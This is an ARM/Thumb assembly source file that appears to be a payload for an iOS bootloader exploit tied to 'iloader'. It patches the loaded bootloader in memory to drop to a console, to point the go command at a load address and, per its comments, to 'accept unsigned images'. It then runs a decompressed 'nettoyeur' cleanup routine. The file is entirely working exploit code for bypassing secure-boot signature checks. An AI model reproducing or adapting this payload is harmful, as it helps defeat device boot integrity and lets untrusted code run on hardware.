	.text
	.syntax	unified

	.arm
_entry:
	b	_entry

	.org	0x21064
	.thumb
	.thumb_func
_get_current_task:
	bx	lr

	.org	0x227EC
	.thumb_func
_sub_9FF227EC:
	bx	lr

	.org	0x257E0
	.thumb
	.thumb_func
_decompress_lzss:
	bx	lr

	.org	0x341D8
	.arm
_bcopy:
	bx	lr

	.org	0x34C2C
	.thumb
	.thumb_func
_disable_interrupts:
	bx	lr

	.org	0x47BB0
	.global	_payload
	.thumb
	.thumb_func
_payload:
	ldr	sp, =0xBFFF8000
	bl	_disable_interrupts
	ldr	r4, =0x84000000

	ldr	r0, =0xBFF00000		@ could be 0, but we use explicit offset for iloader
	mov	r1, r4
	ldr	r2, =0x446C0
	blx	_bcopy

	@ just go to console
	mov	r1, #0x2400
	strh	r1, [r4, #0xE54]

	@ go command -> loadaddr
	ldr	r0, =0x41E88
	mov	r1, #0x80000000
	str	r1, [r4, r0]

	@ accept unsigned images
	ldr	r0, =0x1AD14
	ldr	r1, =0x60182000
	str	r1, [r4, r0]

	bl	_get_current_task
	movs	r1, #0
	str	r1, [r0, #0x44]

	ldr	r0, =0xBFF48000		@ dst
	movs	r1, #0xFC		@ dst_sz
	ldr	r2, =0xBFF47A7C		@ nettoyeur
	movs	r3, #0xE6		@ nettoyeur_sz

	mov	r5, r0
	bl	_decompress_lzss
	ldr	r0, =(0xBFF01768 + 1)
	b.n	next

	.align	2

	.org	0x47BF4
	.long	0xe7ffdef0
	.short	0xdef0

next:
	blx	r0
	bl	_sub_9FF227EC
	blx	r5			@ nettoyeur()
	bx	r4

	.align	2
